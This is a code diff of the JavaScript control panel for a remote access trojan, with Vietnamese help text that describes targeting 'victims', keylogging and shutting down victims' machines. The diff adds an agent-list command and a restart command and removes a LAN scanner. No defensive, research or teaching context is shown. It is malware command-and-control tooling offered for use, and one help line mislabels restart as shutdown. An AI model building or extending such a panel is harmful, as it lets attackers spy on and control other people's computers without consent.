@@ -1,6 +1,5 @@
 import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
-import { LanScanner } from './modules/scanner.js';
 
 const appState = {
     isConnected: false,
@@ -85,8 +84,6 @@ const gateway = new Gateway({
     }
 });
 
-const scanner = new LanScanner();
-
 window.ui = ui; 
 
 window.help = () => {
@@ -94,7 +91,8 @@ window.help = () => {
     console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
     
     console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
-    console.log("connect(ip)       - Kết nối tới server (VD: connect('localhost'))");
+    //console.log("connect(ip)       - Kết nối tới server (VD: connect('localhost'))");
+    console.log("getAgentList()    - fetch agent list")
     console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
     console.log("scan()            - Quét mạng LAN tìm IP Server");
     console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
@@ -120,15 +118,18 @@ window.help = () => {
     console.group("%c4. KHÁC", "color: #eab308");
     console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
     console.log("shutdownAgent()   - Tắt máy nạn nhân");
+    console.log("restartAgent()   - Tắt máy nạn nhân");
     console.log("help()            - Xem lại bảng này");
     console.groupEnd();
     
     return "Hãy bắt đầu bằng lệnh: connect('localhost')";
 };
 
-window.connect = (ip = 'localhost') => {
-    gateway.connect(ip);
-};
+gateway.connect('localhost');
+
+window.getAgentList = () => {
+    gateway.refreshAgents();
+}
 
 window.auth = () => {
     if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
@@ -182,6 +183,12 @@ window.stopKeylog = () => {
 window.shutdownAgent = () => {
     if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
         gateway.send(CONFIG.CMD.SHUTDOWN, "");
+    }
+}
+
+window.restartAgent = () => {
+    if (confirm("RESTART?")) {
+        gateway.send(CONFIG.CMD.RESTART, "");
     }
 }
 
